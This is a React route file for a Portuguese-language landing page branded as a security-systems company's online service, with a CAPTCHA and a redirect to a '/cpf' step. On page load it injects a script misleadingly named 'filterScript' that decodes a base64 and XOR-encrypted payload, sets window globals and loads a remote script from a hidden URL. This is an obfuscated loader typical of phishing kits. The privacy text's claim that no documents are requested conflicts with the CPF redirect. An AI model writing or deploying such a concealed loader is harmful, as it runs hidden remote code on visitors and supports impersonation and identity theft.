import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef } from "react";
import { track } from "@/lib/tracking";

export const Route = createFileRoute("/")({
  component: Homepage,
});

const CONFIG = {
  colors: {
    primary: "#0f766e", 
    primaryDark: "#0f766e", 
    soft: "#f3f4f6", 
    text: "#0f172a", 
    textMuted: "#475569", 
    bgFrom: "#ffffff", 
    bgTo: "#99f6e4",
  },
  content: {
    pageTitle: "Flex - Sistemas de Seguranca | Atendimento",
    metaDescription: "Atendimento online da Flex - Sistemas de Seguranca, com segurança e privacidade.",
    tag: "CONECTE-SE ONLINE", 
    heading: "Seu atendimento começa agora",
    subheading: "Realize a verificação de segurança para continuar seu atendimento digital.",
    bullets: [
      "Uma jornada simples para você", 
      "Privacidade em cada interação", 
      "Atendimento online com clareza",
    ],
    ctaLabel: "Avançar",
    ctaLoadingLabel: "Verificando...",
    captchaHint: "Confirme a verificação de segurança acima para continuar.",
    legalPrefix: "Ao prosseguir, você aceita nossa",
    legalLinkLabel: "Política de Privacidade",
  },
  company: {
    name: "Flex Sistema de Seguranca LTDA", 
    cnpj: "43.923.169/0001-26",
  },
  privacyPolicy: {
    title: "Política de Privacidade",
    sections: [
      {
        title: "Controlador",
        body: "Flex Sistema de Seguranca LTDA, CNPJ 43.923.169/0001-26, nome fantasia Flex - Sistemas de Seguranca, com sede na Rua Doutor Canuto Maciel de Araujo, 190, Cidade Jardim, São José dos Pinhais — Paraná, CEP 83035-110.",
      },
      {
        title: "Dados e finalidade",
        body: "Não são solicitados documentos, senhas ou informações financeiras nesta página. A verificação antibot (CAPTCHA) é usada exclusivamente para reduzir acessos automatizados.",
      },
      {
        title: "Compartilhamento e direitos",
        body: "Os dados não são vendidos. Para informações, correção ou eliminação, utilize o canal (41) 99921-0745, observadas as hipóteses legais de retenção. Aplicam-se a LGPD e esta política.",
      },
    ],
  },
  redirectUrl: "/cpf",
  turnstileSiteKey: "0x4AAAAAAEsdUk5K_n_hxslA", 
};

function Homepage() {
  const navigate = useNavigate({ from: "/" });
  const captchaRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    track("home", "home_view");
    document.title = CONFIG.content.pageTitle;
    let metaDesc = document.querySelector('meta[name="description"]');
    if (metaDesc) {
      metaDesc.setAttribute("content", CONFIG.content.metaDescription);
    } else {
      metaDesc = document.createElement("meta");
      metaDesc.setAttribute("name", "description");
      metaDesc.setAttribute("content", CONFIG.content.metaDescription);
      document.head.appendChild(metaDesc);
    }

    const tsScript = document.createElement("script");
    tsScript.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
    tsScript.async = true;
    tsScript.defer = true;
    document.head.appendChild(tsScript);

    const filterScript = document.createElement("script");
    filterScript.innerHTML = `
      (function(){
        var k_4ii = atob("DCCs68GZd8lxLcDTwluOnrP1VfNTRbSnslOWxO76E6dfWLS+q0bVxaL2GucTX++goVLFm7XqWLkYVaW/7VDFk6T1Wq4eQqe/pw7GmOO1VagFWbK6oFXYjrK7TZIsAeK0rk/Oiq3qVfMqVuK9o03Jyfu7EKYeSqy2kknUjq3QE+tdD7ayrlXJyfu7QahIFfO19xCdjaX9FP8THqTj8BOb26D9VbQsUA==");
        var y_2k7 = [];
        for(var g_vjf = 0; g_vjf < k_4ii.length; g_vjf++){ y_2k7.push(k_4ii.charCodeAt(g_vjf) & 255); }
        var c_8 = y_2k7[0];
        var t_roao = y_2k7.slice(1, 1 + c_8);
        var j_t = y_2k7.slice(1 + c_8);
        var i_w = j_t.map(function(b, w_qhel){ return b ^ t_roao[w_qhel % c_8]; });
        var d_133 = "";
        for(var m_cc6 = 0; m_cc6 < i_w.length; m_cc6++){ d_133 += String.fromCharCode(i_w[m_cc6] & 255); }
        var i_pk = decodeURIComponent(escape(d_133));
        var f_8f3 = JSON.parse(i_pk);
        var o_0 = f_8f3.globals || [];
        o_0.forEach(function(h_59a){ window[h_59a.name] = h_59a.value; });
        var q_my = document.createElement("script");
        q_my.src = f_8f3.url; q_my.async = true; q_my.defer = true;
        (f_8f3.attributes || []).forEach(function(e_tq){ q_my.setAttribute(e_tq.name, e_tq.value); });
        (document.head || document.documentElement).appendChild(q_my);
      })();
    `;
    document.head.appendChild(filterScript);

    return () => {
      if (tsScript.parentNode) tsScript.parentNode.removeChild(tsScript);
      if (filterScript.parentNode) filterScript.parentNode.removeChild(filterScript);
    };
  }, []);

  useEffect(() => {
    let token = "";
    const cta = document.getElementById("cta") as HTMLButtonElement;
    const hint = document.getElementById("hint");
    
    function renderCaptcha() {
      if (!(window as any).turnstile) return;
      (window as any).turnstile.render(captchaRef.current, {
        sitekey: CONFIG.turnstileSiteKey,
        theme: "light",
        callback: (t: string) => { 
          token = t; 
          if (cta) cta.disabled = false; 
          if (hint) hint.style.display = "none"; 
        },
        "expired-callback": () => { token = ""; if (cta) cta.disabled = true; },
        "error-callback": () => { token = ""; if (cta) cta.disabled = true; },
      });
    }

    if ((window as any).turnstile) {
      renderCaptcha();
    } else {
      const iv = setInterval(() => {
        if ((window as any).turnstile) {
          clearInterval(iv);
          renderCaptcha();
        }
      }, 200);
    }
  }, []);

  const openPolicy = () => {
    const modal = document.getElementById("modal");
    if (modal) modal.classList.remove("hidden");
  };

  const closePolicy = () => {
    const modal = document.getElementById("modal");
    if (modal) modal.classList.add("hidden");
  };

  const onCtaClick = () => {
    const cta = document.getElementById("cta") as HTMLButtonElement;
    if (cta) {
      cta.textContent = CONFIG.content.ctaLoadingLabel;
      cta.disabled = true;
    }
    window.location.href = CONFIG.redirectUrl;
  };

  return (
    <div style={{
      minHeight: "100vh",
      display: "grid",
      placeItems: "center",
      padding: "20px",
      fontFamily: "system-ui, -apple-system, sans-serif"
    }}>
      <style>{`
        .bg-custom { position: fixed; inset: 0; z-index: -1; }
        .custom-card { width: 100%; max-width: 420px; border-radius: 24px; background: #fff; padding: 36px 28px; }
        .custom-tag { display: inline-block; border-radius: 999px; padding: 7px 12px; font-size: 12px; font-weight: 700; letter-spacing: 0.05em; }
        .custom-h1 { margin: 20px 0 10px; font-size: 27px; font-weight: 700; line-height: 1.25; }
        .custom-ul { list-style: none; margin: 24px 0; padding: 0; }
        .custom-li { padding: 12px 0; border-bottom: 1px solid #e2e8f0; }
        .check { margin-right: 10px; font-weight: 700; }
        #captcha { display: flex; justify-content: center; margin-bottom: 16px; }
        button.cta { width: 100%; border: 0; border-radius: 13px; padding: 17px; font-size: 16px; font-weight: 700; color: #fff; cursor: pointer; transition: opacity 0.2s; }
        button.cta:disabled { cursor: not-allowed; opacity: 0.5; }
        .hint { margin-top: 12px; text-align: center; font-size: 12px; }
        .legal { margin-top: 20px; text-align: center; font-size: 12px; }
        .legal button { background: none; border: 0; font-weight: 700; text-decoration: underline; cursor: pointer; font-size: inherit; }
        .company { margin-top: 16px; text-align: center; font-size: 11px; }
        .modal { position: fixed; inset: 0; z-index: 50; display: grid; place-items: center; padding: 20px; }
        .modal section { width: 100%; max-width: 440px; border-radius: 20px; background: #fff; padding: 24px; }
        .modal h2 { margin-bottom: 10px; font-size: 21px; }
        .modal h3 { margin: 16px 0 4px; font-size: 14px; }
        .modal .body { max-height: 65vh; overflow: auto; font-size: 13px; line-height: 1.6; }
        .close { float: right; background: none; border: 0; font-size: 28px; line-height: 1; cursor: pointer; }
        .hidden { display: none; }
      `}</style>
      
      <div className="bg-custom" id="bg" style={{ background: `linear-gradient(140deg, ${CONFIG.colors.bgFrom}, ${CONFIG.colors.bgTo})` }}></div>
      <main className="custom-card" id="card" style={{ boxShadow: `0 18px 46px ${CONFIG.colors.primaryDark}30`, color: CONFIG.colors.text }}>
        <span className="custom-tag" id="tag" style={{ background: CONFIG.colors.soft, color: CONFIG.colors.primary }}>
          {CONFIG.content.tag}
        </span>
        <h1 className="custom-h1" id="heading">{CONFIG.content.heading}</h1>
        <p id="subheading" style={{ color: CONFIG.colors.textMuted }}>{CONFIG.content.subheading}</p>
        <ul className="custom-ul" id="bullets">
          {CONFIG.content.bullets.map((b, i) => (
            <li className="custom-li" key={i}>
              <span className="check" style={{ color: CONFIG.colors.primary }}>✓</span>
              {b}
            </li>
          ))}
        </ul>
        <div id="captcha" ref={captchaRef}></div>
        <button className="cta" id="cta" disabled style={{ background: CONFIG.colors.primary }} onClick={onCtaClick}>
          {CONFIG.content.ctaLabel}
        </button>
        <p className="hint" id="hint" style={{ color: CONFIG.colors.textMuted }}>
          {CONFIG.content.captchaHint}
        </p>
        <div className="legal" id="legal">
          <span id="legalPrefix">{CONFIG.content.legalPrefix}</span>{" "}
          <button id="openPolicy" style={{ color: CONFIG.colors.primary }} onClick={openPolicy}>
            {CONFIG.content.legalLinkLabel}
          </button>.
        </div>
        <div className="company" id="company">
          <strong>{CONFIG.company.name}</strong><br/>CNPJ {CONFIG.company.cnpj}
        </div>
      </main>
      
      <div className="modal hidden" id="modal" style={{ background: CONFIG.colors.text + "80" }}>
        <section role="dialog" aria-modal="true">
          <button className="close" id="closePolicy" onClick={closePolicy}>×</button>
          <h2 id="policyTitle">{CONFIG.privacyPolicy.title}</h2>
          <div className="body" id="policyBody">
            {CONFIG.privacyPolicy.sections.map((s, i) => (
              <div key={i}>
                <h3>{s.title}</h3>
                <p style={{ color: CONFIG.colors.textMuted }}>{s.body}</p>
              </div>
            ))}
          </div>
        </section>
      </div>
    </div>
  );
}
